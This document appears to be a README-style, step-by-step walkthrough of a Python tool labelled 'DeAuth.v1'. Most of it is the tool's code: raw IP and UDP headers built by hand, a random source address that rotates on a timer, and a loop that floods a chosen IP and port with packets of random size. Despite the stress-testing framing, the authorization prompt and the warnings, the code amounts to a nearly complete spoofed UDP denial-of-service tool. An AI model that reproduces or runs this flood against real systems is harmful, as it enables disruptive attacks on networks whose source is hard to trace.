### **Usage Example**

- Target IP: `192.168.1.1`
- Port: `80`
- Packet Size: `100-1000 bytes`
- Duration: `60 seconds`
- Spoof Interval: `10 seconds`

During the test:

- The spoofed IP changes every 10 seconds.
- The script continues sending packets from the new spoofed IP.

The provided script is a network stress-testing tool with **IP spoofing** that periodically changes the spoofed source IP address. Let’s break it down step by step to understand its functionality.

---

### **1. Imports**
```python
import socket
import random
import struct
import time
import colorama
from colorama import Fore, Style
```
- **`socket`**: Provides access to low-level networking capabilities, including raw sockets for crafting custom packets.
- **`random`**: Used to generate random data for packets, IP addresses, and packet sizes.
- **`struct`**: Used for packing and unpacking binary data, necessary for crafting raw IP and UDP headers.
- **`time`**: Provides time-related functionality, such as delays and timestamps.
- **`colorama`**: Adds color to terminal output, enhancing user experience.

---

### **2. Initial Setup**
```python
colorama.init(autoreset=True)
```
- **`colorama.init(autoreset=True)`**: Ensures colors reset after each print statement, preventing unwanted color spills in the terminal.

```python
print("\n" * 100)
```
- Clears the terminal by printing 100 blank lines.

---

### **3. Banner and Disclaimers**
The banner introduces the tool and reminds the user of ethical usage requirements:
```python
print(Fore.MAGENTA + Style.BRIGHT)
print("""
▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ 
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ 
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
 ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
   ░       ░  ░     ░  ░   ░               ░  ░  ░
 ░                                DeAuth.v1                                        
""")
print(Fore.BLUE + "This tool is for authorized stress testing of public or private systems only.")
print(Fore.RED + "Unauthorized use is illegal and unethical. Proceed only with explicit permission.")
```
- **Banner**: Cosmetic header that provides a version label.
- **Warnings**: Reminds the user of ethical and legal obligations.

---

### **4. Utility Functions**
#### Logging
```python
def log_test(ip, port, duration, min_packet_size, max_packet_size, spoof_interval):
    with open("test_log.txt", "a") as log_file:
        log_file.write(
            f"Target: {ip}, Port: {port}, Duration: {duration}s, "
            f"Packet Size Range: {min_packet_size}-{max_packet_size} bytes, "
            f"IP Spoof Interval: {spoof_interval}s, Time: {time.ctime()}\n"
        )
    print(Fore.GREEN + "[*] Test details logged.")
```
- Logs test details (IP, port, duration, packet size range, and spoof interval) into `test_log.txt`.
- Ensures accountability for ethical usage.

#### Random IP Generation
```python
def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
```
- Generates a random IP address by randomly selecting numbers for each octet (1–255).

#### Checksum Calculation
```python
def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s = (s + w) & 0xFFFF
    return ~s & 0xFFFF
```
- Calculates the checksum for the IP header, ensuring packet integrity.

---

### **5. User Input**
```python
ip = input(Fore.BLUE + "Enter the target IP (public or private): " + Fore.MAGENTA)
port = int(input(Fore.BLUE + "Enter the target port: " + Fore.MAGENTA))
```
- **`ip`**: Target's IP address.
- **`port`**: Target port (e.g., 80 for HTTP).

```python
min_packet_size = int(input(Fore.BLUE + "Enter the minimum packet size (bytes, minimum 1): " + Fore.MAGENTA))
max_packet_size = int(input(Fore.BLUE + "Enter the maximum packet size (bytes, max 65500): " + Fore.MAGENTA))
```
- **Packet Size Range**: Defines the range of packet sizes (minimum and maximum).

```python
duration = int(input(Fore.BLUE + "Enter the duration for the test (seconds): " + Fore.MAGENTA))
spoof_interval = int(input(Fore.BLUE + "Enter the IP spoofing interval (seconds): " + Fore.MAGENTA))
```
- **`duration`**: Total time for the stress test.
- **`spoof_interval`**: Time interval (in seconds) after which the spoofed IP changes.

---

### **6. Confirmation**
```python
confirm = input(Fore.RED + "Do you confirm that you have written authorization to test this target? (yes/no): " + Fore.MAGENTA)
if confirm.lower() != "yes":
    print(Fore.RED + "[!] Test aborted by user.")
    exit()
```
- Asks for user confirmation to ensure ethical testing.
- Aborts the script if the user does not confirm.

---

### **7. Test Execution**
#### Initializing Variables
```python
timeout = time.time() + duration  # End time of the test
next_spoof_time = time.time()  # Time when the next IP spoofing occurs
sent = 0  # Counter for packets sent
current_spoofed_ip = random_ip()  # Initial spoofed IP address
```
- **`timeout`**: The test stops when the current time exceeds this value.
- **`next_spoof_time`**: Tracks when the spoofed IP should change.
- **`current_spoofed_ip`**: The current spoofed IP address.

#### Sending Packets
```python
while time.time() < timeout:
    if time.time() >= next_spoof_time:
        current_spoofed_ip = random_ip()
        next_spoof_time = time.time() + spoof_interval
        print(Fore.YELLOW + f"\n[!] Changing spoofed IP to {current_spoofed_ip}")
```
- Periodically changes the spoofed IP based on the user-defined interval (`spoof_interval`).

```python
packet_size = random.randint(min_packet_size, max_packet_size)  # Random packet size
data = random._urandom(packet_size)  # Packet data
```
- Randomizes packet size and generates a random payload.

#### IP Header Construction
```python
ip_header = struct.pack(
    "!BBHHHBBH4s4s",
    69, 0, 20 + len(data), random.randint(0, 65535), 0, 64, socket.IPPROTO_UDP, 0,
    socket.inet_aton(current_spoofed_ip), socket.inet_aton(ip)
)
ip_checksum = checksum(ip_header)
```
- Crafts the IP header with fields like version, length, TTL, protocol, and source/destination IPs.
- Calculates and updates the checksum.

#### UDP Header Construction
```python
udp_header = struct.pack(
    "!HHHH",
    random.randint(1024, 65535),  # Random source port
    port,  # Target port
    8 + len(data),  # UDP header + data length
    0  # Checksum
)
```
- Crafts the UDP header with source port, destination port, and length fields.

#### Sending Packet
```python
sock.sendto(ip_header + udp_header + data, (ip, port))
sent += 1
```
- Sends the crafted packet to the target.
- Increments the packet counter.

#### Feedback
```python
print(Fore.MAGENTA + f"[+] Sent {sent} packets from {current_spoofed_ip} to {ip} on port {port} (size: {packet_size} bytes)", end="\r")
```
- Displays real-time feedback on packets sent, including the spoofed IP, target IP, port, and packet size.

---

### **8. Error Handling and Cleanup**
```python
except Exception as e:
    print(Fore.RED + f"[!] An error occurred: {e}")
finally:
    sock.close()
```
- Handles any errors during execution and ensures the socket is closed properly.

---

### **Key Features**
1. **Randomized IP Spoofing**: Source IP changes periodically (`spoof_interval`).
2. **Dynamic Packet Sizes**: Varies packet sizes for more realistic traffic simulation.
3. **Logging**: Tracks test details for accountability.
4. **Safety Checks**: Prompts the user to confirm ethical usage.

---

### **Warnings**
This tool is intended for **authorized testing only**. Always ensure:

1. You have explicit, documented permission from the target system owner.
2. You conduct tests in a controlled environment.
3. You adhere to applicable laws and ethical standards.